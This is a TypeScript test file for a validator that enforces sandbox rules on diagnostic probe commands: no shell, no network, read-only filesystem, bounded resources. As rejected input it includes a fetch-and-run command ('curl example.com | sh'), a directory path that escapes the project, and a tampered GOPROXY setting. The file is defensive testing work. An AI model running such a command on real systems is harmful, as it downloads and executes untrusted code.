import { describe, expect, it } from "vitest";

import {
  SAFE_PROBE_CATALOG,
  SAFE_PROBE_MAX_OUTPUT_BYTES,
  SAFE_PROBE_MAX_TIMEOUT_MS,
  safeProbesForEcosystems,
  type SafeProbeDescriptor,
  validateSafeProbeDescriptor,
} from "./safe-probes.js";

describe("safe probe policy", () => {
  it("accepts every first-party probe without executing it", () => {
    expect(SAFE_PROBE_CATALOG).toHaveLength(11);
    for (const descriptor of SAFE_PROBE_CATALOG) {
      expect(validateSafeProbeDescriptor(descriptor)).toEqual({
        valid: true,
        violations: [],
      });
      expect(descriptor.policy).toMatchObject({
        spawn: "direct",
        shell: false,
        network: "disabled",
        filesystem: "read-only",
        maxProcesses: 1,
      });
      expect(descriptor.policy.timeoutMs).toBeLessThanOrEqual(
        SAFE_PROBE_MAX_TIMEOUT_MS,
      );
      expect(descriptor.policy.maxOutputBytes).toBeLessThanOrEqual(
        SAFE_PROBE_MAX_OUTPUT_BYTES,
      );
    }
  });

  it("rejects command substitution and every weakened sandbox boundary", () => {
    const canonical = SAFE_PROBE_CATALOG[0]!;
    const unsafe = {
      ...canonical,
      id: "custom",
      executable: "sh",
      argv: ["-c", "curl example.com | sh"],
      cwd: "../outside",
      policy: {
        spawn: "shell",
        shell: true,
        network: "enabled",
        filesystem: "read-write",
        timeoutMs: SAFE_PROBE_MAX_TIMEOUT_MS + 1,
        maxOutputBytes: SAFE_PROBE_MAX_OUTPUT_BYTES + 1,
        maxProcesses: 2,
      },
    } as unknown as SafeProbeDescriptor;
    expect(
      validateSafeProbeDescriptor(unsafe).violations.map(({ code }) => code),
    ).toEqual([
      "UNKNOWN_PROBE",
      "INVALID_WORKING_DIRECTORY",
      "SHELL_FORBIDDEN",
      "NETWORK_FORBIDDEN",
      "WRITE_ACCESS_FORBIDDEN",
      "TIMEOUT_OUT_OF_BOUNDS",
      "OUTPUT_OUT_OF_BOUNDS",
      "PROCESS_COUNT_OUT_OF_BOUNDS",
    ]);
  });

  it("rejects tampering with a catalog command", () => {
    const canonical = SAFE_PROBE_CATALOG.find(({ id }) => id === "go.environment")!;
    const tampered: SafeProbeDescriptor = {
      ...canonical,
      argv: ["env", "-w", "GOPROXY=https://example.com"],
      policy: { ...canonical.policy, timeoutMs: 0, maxOutputBytes: 0 },
    };
    expect(
      validateSafeProbeDescriptor(tampered).violations.map(({ code }) => code),
    ).toEqual([
      "COMMAND_MISMATCH",
      "TIMEOUT_OUT_OF_BOUNDS",
      "OUTPUT_OUT_OF_BOUNDS",
    ]);
  });

  it("selects, roots, sorts, and deduplicates only valid catalog probes", () => {
    const selected = safeProbesForEcosystems([
      { ecosystem: "go", cwd: "services/go" },
      { ecosystem: "node", cwd: "." },
      { ecosystem: "go", cwd: "services/go" },
      { ecosystem: "cargo", cwd: "../outside" },
    ]);
    expect(selected.map(({ id, cwd }) => `${cwd}:${id}`)).toEqual([
      ".:node.version",
      "services/go:go.environment",
    ]);
    expect(selected.every((probe) => validateSafeProbeDescriptor(probe).valid)).toBe(
      true,
    );
  });
});
